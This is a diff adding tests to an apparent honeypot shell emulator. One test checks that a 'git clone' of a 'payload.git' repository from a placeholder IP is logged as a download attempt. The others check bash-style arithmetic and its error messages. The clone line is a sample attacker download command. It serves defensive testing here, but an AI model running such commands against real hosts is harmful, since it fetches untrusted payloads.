@@ -286,3 +286,57 @@ def test_proc_lists_ps_pids_and_cwd_follows_cd() -> None:
     run(sh, "cd /tmp")
     assert run(sh, "readlink /proc/self/cwd") == "/tmp\n"
     assert run(sh, "readlink /proc/$$/cwd") == "/tmp\n"
+
+
+def test_git_clone_is_recorded_as_a_download_attempt() -> None:
+    sh = make("secret-a")
+    sh.run_line("git clone http://203.0.113.7/x/payload.git")
+    events = [p for p in sh.pending if p.type == "download_attempt"]
+    assert events and events[-1].data["url"] == "http://203.0.113.7/x/payload.git"
+    assert events[-1].data["tool"] == "git"
+
+
+@pytest.mark.parametrize(
+    ("expr", "want"),
+    [
+        ("2**10", 1024),
+        ("2**64", 0),
+        ("2**3**2", 512),
+        ("1<<62", 1 << 62),
+        ("1<<64", 1),
+        ("-1>>70", -1),
+        ("0x10+010", 24),
+        ("16#ff", 255),
+        ("2#101", 5),
+        ("-2**2", 4),
+        (
+            "3**100000000000",
+            pow(3, 100000000000, 1 << 64)
+            - (1 << 64 if pow(3, 100000000000, 1 << 64) >= 1 << 63 else 0),
+        ),
+    ],
+)
+def test_wide_arithmetic(expr: str, want: int) -> None:
+    assert evaluate(expr, lambda _n: "") == want
+
+
+@pytest.mark.parametrize(
+    ("expr", "text"),
+    [
+        ("2**-1", 'exponent less than 0 (error token is "-1")'),
+        ("1 +", 'syntax error: operand expected (error token is "+")'),
+        ("08", 'value too great for base (error token is "08")'),
+        ("1/0", 'division by 0 (error token is "0")'),
+        ("1 $ 2", 'syntax error: operand expected (error token is "$ 2")'),
+    ],
+)
+def test_arith_messages_use_bash_quoting(expr: str, text: str) -> None:
+    with pytest.raises(ArithError) as err:
+        evaluate(expr, lambda _n: "")
+    assert str(err.value) == text
+
+
+def test_arith_shell_message() -> None:
+    out = make("secret-a").run_line("echo $((1 +))").output
+    assert '1 +: syntax error: operand expected (error token is "+")' in out
+    assert "'" not in out.split("error token")[1]
